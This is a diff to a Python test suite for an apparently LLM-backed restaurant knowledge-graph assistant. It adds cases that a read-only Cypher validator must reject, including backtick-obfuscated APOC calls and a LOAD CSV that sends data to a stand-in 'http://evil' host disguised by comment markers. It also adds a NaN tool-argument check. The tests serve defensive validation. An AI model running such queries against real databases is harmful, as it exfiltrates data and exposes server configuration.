@@ -56,6 +56,12 @@ def test_기준정보에_업체별_공급재료와_메뉴id가_들어간다(kdb)
     ("MERGE (x:Hack {id: 1})", False),
     ("CALL apoc.periodic.iterate('MATCH (n) RETURN n', 'DELETE n', {})", False),
     ("MATCH (n) CALL (n) { DELETE n } IN TRANSACTIONS", False),
+    ("CALL `apoc`.`load`.json('http://evil')", False),       # 백틱으로 키워드 숨기기
+    ("CALL dbms.listConfig()", False),
+    ("MATCH (m:MenuItem) RETURN m.name AS `이름`", False),   # 백틱 자체를 허용하지 않음
+    ("WITH '/*' AS a LOAD CSV FROM 'http://evil/?d=' + 'x' AS r WITH a, '*/' AS b RETURN 1", False),  # 주석 위장
+    ("MATCH (m) RETURN m // 주석", False),
+    ("MATCH (m:MenuItem) WHERE m.name CONTAINS '찌개' RETURN m.name", True),
 ])
 def test_쓰기_쿼리는_차단(q, ok):
     assert G.is_read_only(q) is ok
@@ -118,3 +124,10 @@ def test_실호출_9월_원가율_질문():
     with get_driver() as driver:
         out = G.ask(driver, "9월 식재료 원가율은 7월보다 몇 %p 올랐어?")
     assert out["evidence"] and "39" in out["answer"]
+
+
+def test_NaN_인자는_도구에_넘기지_않는다(kdb):
+    bad = SimpleNamespace(id="c1", type="function", function=SimpleNamespace(name="propose_action",
+                          arguments='{"action_type": "change_price", "args": {"menu_id": "M-A", "new_price": NaN}}'))
+    out = G.ask(kdb, "?", llm=FakeLLM((None, [bad]), ("끝", None)))
+    assert "error" in out["evidence"][0]["result"] and out["proposals"] == []
